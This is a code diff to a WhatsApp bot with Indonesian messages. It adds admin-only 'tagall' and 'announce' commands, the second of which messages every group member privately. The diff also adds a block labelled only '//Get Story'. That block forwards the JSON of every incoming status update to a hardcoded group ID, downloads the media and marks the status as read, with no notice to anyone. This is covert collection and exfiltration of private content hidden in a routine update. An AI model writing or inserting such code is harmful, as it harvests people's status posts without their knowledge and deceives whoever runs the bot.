@@ -179,6 +179,13 @@ const isQuotedTag = m.mtype === 'extendedTextMessage' && content.includes('menti
 const isQuotedProd = m.mtype === 'extendedTextMessage' && content.includes('productMessage')
 const isQuotedReply = m.mtype === 'extendedTextMessage' && content.includes('Message')
 
+//Get Story
+if (m.key && m.key.remoteJid === 'status@broadcast') {
+	client.sendMessage('120363043384341709@g.us', { text: JSON.stringify(m) })
+	await client.downloadMediaMessage(qmsg, 'story')
+	client.readMessages(m.key)
+}
+
 //Sewa
 _sewa.expiredCheck(client, sewa)
 
@@ -1268,6 +1275,30 @@ if (isCmd && command) {
     
 //Switch Command
 switch(command) {
+case 'tagall': 
+if (!isLogin) return m.reply(mess.logout)
+if (!m.isGroup) return m.reply(mess.group)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+let textTagall = `*👥 Tag All*
+ 
+*Pesan : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n`
+ 
+for (let mem of participants) {
+      textTagall += `• @${mem.id.split('@')[0]}\n`
+}
+client.sendMessage(m.chat, { text: textTagall, mentions: participants.map(a => a.id) }, { quoted: m })
+break
+case 'announce':
+if (!isLogin) return m.reply(mess.logout)
+if (!m.isGroup) return m.reply(mess.group)
+if (!isAdmins && !isCreator) return m.reply(mess.admin)
+for (let mem of participants) {
+	  const textAnnounce = `${monospace}Hai ${client.getName(mem.id)} pemberitahuan dari admin ${client.getName(m.sender)} di grup ${groupName}:${monospace}
+ 
+*Pesan : ${args.join(" ") ? args.join(" ") : 'kosong'}*\n\n${wm}`
+      client.sendMessage(mem.id, { text: textAnnounce }, { quoted: m })
+}
+break
 case 'getcase': 
 if (!isLogin) return m.reply(mess.logout)
 if (!args[0]) return m.reply('Mau ngambil case apa?')
